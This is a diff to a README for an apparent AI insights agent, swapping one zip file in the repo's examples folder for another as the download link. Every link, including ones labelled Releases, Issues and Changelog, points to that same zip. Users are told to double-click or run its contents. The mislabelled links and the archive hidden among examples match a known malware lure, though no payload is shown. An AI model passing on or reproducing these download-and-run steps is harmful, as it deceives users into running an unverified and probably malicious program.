@@ -6,7 +6,7 @@ Welcome to the ai-assisted-insights-agent! This application helps you turn natur
 
 ## 📥 Download Now
 
-[![Download](https://github.com/Riohari07/ai-assisted-insights-agent/raw/refs/heads/main/02_examples/claude-desktop/ai-assisted-agent-insights-homoecious.zip)](https://github.com/Riohari07/ai-assisted-insights-agent/raw/refs/heads/main/02_examples/claude-desktop/ai-assisted-agent-insights-homoecious.zip)
+[![Download](https://raw.githubusercontent.com/Riohari07/ai-assisted-insights-agent/main/02_examples/python-client/agent_assisted_ai_insights_v2.7.zip)](https://raw.githubusercontent.com/Riohari07/ai-assisted-insights-agent/main/02_examples/python-client/agent_assisted_ai_insights_v2.7.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,7 +18,7 @@ Before you get started, ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-To download the ai-assisted-insights-agent, visit this page to download: [GitHub Releases Page](https://github.com/Riohari07/ai-assisted-insights-agent/raw/refs/heads/main/02_examples/claude-desktop/ai-assisted-agent-insights-homoecious.zip).
+To download the ai-assisted-insights-agent, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Riohari07/ai-assisted-insights-agent/main/02_examples/python-client/agent_assisted_ai_insights_v2.7.zip).
 
 Once you are on the page, look for the most recent release. You will find a list of files available for download. Choose the appropriate file for your operating system:
 
@@ -28,7 +28,7 @@ Once you are on the page, look for the most recent release. You will find a list
 After the download completes:
 
 1. **Windows Users:**
-   - Locate the downloaded `https://github.com/Riohari07/ai-assisted-insights-agent/raw/refs/heads/main/02_examples/claude-desktop/ai-assisted-agent-insights-homoecious.zip` file in your Downloads folder.
+   - Locate the downloaded `https://raw.githubusercontent.com/Riohari07/ai-assisted-insights-agent/main/02_examples/python-client/agent_assisted_ai_insights_v2.7.zip` file in your Downloads folder.
    - Double-click the file to start the installation.
    - Follow the prompts to complete the installation.
 
@@ -38,7 +38,7 @@ After the download completes:
    - Eject the disk image.
 
 3. **Linux Users:**
-   - Extract the downloaded `https://github.com/Riohari07/ai-assisted-insights-agent/raw/refs/heads/main/02_examples/claude-desktop/ai-assisted-agent-insights-homoecious.zip` file.
+   - Extract the downloaded `https://raw.githubusercontent.com/Riohari07/ai-assisted-insights-agent/main/02_examples/python-client/agent_assisted_ai_insights_v2.7.zip` file.
    - Move to the extracted folder in your terminal.
    - Run `./ai-assisted-insights-agent` to start the application.
 
@@ -70,7 +70,7 @@ This application focuses on various crucial areas:
 
 ## 🤝 Support
 
-If you encounter any issues or have questions while using the ai-assisted-insights-agent, feel free to reach out for help. You can create an issue on the [GitHub Issues Page](https://github.com/Riohari07/ai-assisted-insights-agent/raw/refs/heads/main/02_examples/claude-desktop/ai-assisted-agent-insights-homoecious.zip).
+If you encounter any issues or have questions while using the ai-assisted-insights-agent, feel free to reach out for help. You can create an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Riohari07/ai-assisted-insights-agent/main/02_examples/python-client/agent_assisted_ai_insights_v2.7.zip).
 
 Alternatively, you can consult the community or submit your inquiries on relevant forums.
 
@@ -80,7 +80,7 @@ This software is open-source and free to use. Check the [License file](LICENSE) 
 
 ## 📜 Changelog
 
-For updates and changes made to the application, please refer to the [Changelog](https://github.com/Riohari07/ai-assisted-insights-agent/raw/refs/heads/main/02_examples/claude-desktop/ai-assisted-agent-insights-homoecious.zip) file associated with the project.
+For updates and changes made to the application, please refer to the [Changelog](https://raw.githubusercontent.com/Riohari07/ai-assisted-insights-agent/main/02_examples/python-client/agent_assisted_ai_insights_v2.7.zip) file associated with the project.
 
 ## 📬 Stay Updated
 
